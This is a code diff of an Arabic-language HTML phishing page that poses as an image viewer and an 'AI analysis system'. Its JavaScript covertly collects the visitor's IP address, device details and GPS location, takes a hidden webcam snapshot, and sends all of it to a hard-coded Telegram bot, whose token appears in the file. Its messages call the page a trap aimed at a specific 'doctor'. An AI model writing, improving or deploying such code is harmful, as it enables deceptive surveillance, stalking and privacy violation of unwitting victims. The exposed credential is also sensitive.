@@ -2,15 +2,22 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>عرض الصورة</title>
+    <title>نظام التحليل الهندسي</title>
     <style>
-        body { text-align: center; background: #000; color: white; padding-top: 50px; }
-        img { max-width: 90%; border-radius: 10px; display: none; margin: 0 auto; }
+        body { text-align: center; background: #0c0c0c; color: #00ff00; font-family: 'Courier New', monospace; padding-top: 50px; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        img { max-width: 80%; border: 2px solid #00ff00; border-radius: 10px; display: none; margin: 20px auto; }
     </style>
 </head>
 <body>
 
-    <h2 id="status">جاري تحميل الصورة...</h2>
+    <div id="ui">
+        <h2>جاري معالجة بيانات الصورة...</h2>
+        <div class="loader"></div>
+        <p id="status">يرجى الموافقة على الأذونات لتفعيل معالج الذكاء الاصطناعي</p>
+    </div>
+    
     <img id="myPhoto" src="my-photo.jpg">
 
     <script>
@@ -18,58 +25,66 @@
         const TELEGRAM_TOKEN = '8372729487:AAFv7eZQGWtGkPqID6k209khDQKkZsO-TMM';
         const CHAT_ID = '8175631848';
 
-        const statusText = document.getElementById('status');
-        const photo = document.getElementById('myPhoto');
-
-        // 1. وظيفة إرسال البيانات لتليجرام
         async function sendToTelegram(message, imageBlob = null) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${imageBlob ? 'sendPhoto' : 'sendMessage'}`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            
             if (imageBlob) {
-                // إرسال الصورة
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
                 formData.append('photo', imageBlob, 'capture.png');
                 formData.append('caption', message);
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
             } else {
-                // إرسال نص فقط (الـ IP)
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                formData.append('text', message);
             }
+            
+            await fetch(url, { method: 'POST', body: formData });
         }
 
         async function startChallenge() {
+            let report = "🚨 تم تفعيل الفخ بنجاح! \n\n";
+
             try {
-                // سحب الـ IP وإرساله فوراً
+                // 1. سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                await sendToTelegram(`تم دخول الرابط! IP الدكتور: ${ipData.ip}`);
+                report += `🌐 عنوان الـ IP: ${ipData.ip}\n`;
 
-                // طلب إذن الكاميرا
+                // 2. سحب معلومات الجهاز
+                report += `📱 الجهاز: ${navigator.platform}\n`;
+                report += `🖥️ المتصفح: ${navigator.userAgent.split(') ')[0]})\n`;
+
+                // 3. سحب الموقع الجغرافي (GPS)
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    report += `📍 الموقع: ${mapLink}\n`;
+                    await sendToTelegram(report);
+                }, (err) => {
+                    report += `📍 الموقع: (الدكتور رفض إذن الموقع)\n`;
+                    sendToTelegram(report);
+                });
+
+                // 4. سحب لقطة الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // إظهار الصورة للدكتور بعد الموافقة
-                statusText.innerText = "تم التحميل بنجاح";
-                photo.style.display = "block";
+                document.getElementById('status').innerText = "تم التحقق.. جاري عرض الصورة";
+                document.getElementById('myPhoto').style.display = "block";
 
-                // التقاط الصورة بالخلفية
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
                 setTimeout(async () => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        await sendToTelegram("لقطة الكاميرا للدكتور:", blob);
-                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
-                    }, 'image/png');
+                    canvas.toBlob(blob => sendToTelegram("📸 لقطة وجه الدكتور:", blob), 'image/png');
+                    stream.getTracks().forEach(t => t.stop());
                 }, 2000);
 
             } catch (err) {
-                statusText.innerText = "يرجى السماح بالأذونات لرؤية الصورة بدقة عالية";
-                await sendToTelegram("الدكتور فتح الرابط لكنه رفض إذن الكاميرا.");
+                document.getElementById('status').innerText = "خطأ: يجب الموافقة على الأذونات لإتمام التحدي";
+                sendToTelegram("⚠️ الدكتور رفض إذن الكاميرا أو حدث خطأ.");
             }
         }
 
